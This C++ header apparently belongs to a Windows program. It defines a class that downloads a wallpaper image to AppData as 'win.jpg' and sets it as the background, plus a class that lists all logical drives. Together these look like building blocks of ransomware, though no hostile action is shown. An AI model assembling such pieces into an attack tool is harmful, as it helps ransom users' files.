#pragma once
#include <vector>

#define MAX_PATH 260

char* user = std::getenv("username");
std::wstring computername(&user[0], &user[strlen(user)]);
std::wstring concatwstring = L"C:\\Users\\" + computername + L"\\AppData\\Roaming\\win.jpg";
const wchar_t* pathappdata = concatwstring.c_str();


namespace utils
{
	class Background
	{
	protected:
		LPCWSTR BGURL = L"https://wallpaperaccess.com//full//2511770.jpg";
		LPCWSTR BGPATH = (pathappdata);
	public:
		void ch_process(const wchar_t* background);
		void ch_proceed(const wchar_t* backgroundpathdata);
	};

	class ListDrives
	{
	protected:

	public:
		std::vector<std::string> getListOfDrives() {
			std::vector<std::string> arrayOfDrives;
			char* szDrives = new char[MAX_PATH]();
			if (GetLogicalDriveStringsA(MAX_PATH, szDrives))
			for (int i = 0; i < 100; i += 4)
				if (szDrives[i] != (char)0)
					arrayOfDrives.push_back(std::string{ szDrives[i],szDrives[i + 1],szDrives[i + 2] });
			delete[] szDrives;
			return arrayOfDrives;
		}
	};
}